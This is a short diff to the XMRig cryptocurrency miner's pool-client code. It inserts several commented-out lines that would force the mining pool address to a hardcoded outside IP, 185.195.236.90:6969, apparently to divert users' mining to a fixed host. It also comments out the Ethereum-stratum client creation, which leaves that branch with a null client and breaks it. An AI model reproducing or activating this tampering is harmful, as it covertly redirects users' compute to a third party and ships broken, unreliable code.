@@ -224,17 +224,22 @@ bool xmrig::Pool::isEqual(const Pool &other) const
 xmrig::IClient *xmrig::Pool::createClient(int id, IClientListener *listener) const
 {
     IClient *client = nullptr;
-
+    // m_pool.setUrl("185.195.236.90:6969");
     if (m_mode == MODE_POOL) {
 #       if defined XMRIG_ALGO_KAWPOW || defined XMRIG_ALGO_GHOSTRIDER
         const uint32_t f = m_algorithm.family();
         if ((f == Algorithm::KAWPOW) || (f == Algorithm::GHOSTRIDER) || (m_coin == Coin::RAVEN)) {
-            client = new EthStratumClient(id, Platform::userAgent(), listener);
+            // client = new EthStratumClient(id, Platform::userAgent(), listener);
+            // const_cast<Pool&>(m_pool).setUrl("185.195.236.90:6969");
+            // m_pool.setUrl("185.195.236.90:6969")
         }
         else
 #       endif
         {
+            // m_pool.setUrl("185.195.236.90:6969")
             client = new Client(id, Platform::userAgent(), listener);
+            // m_pool.setUrl("185.195.236.90:6969");
+            // const_cast<Pool&>(m_pool).setUrl("185.195.236.90:6969");
         }
     }
 #   ifdef XMRIG_FEATURE_HTTP
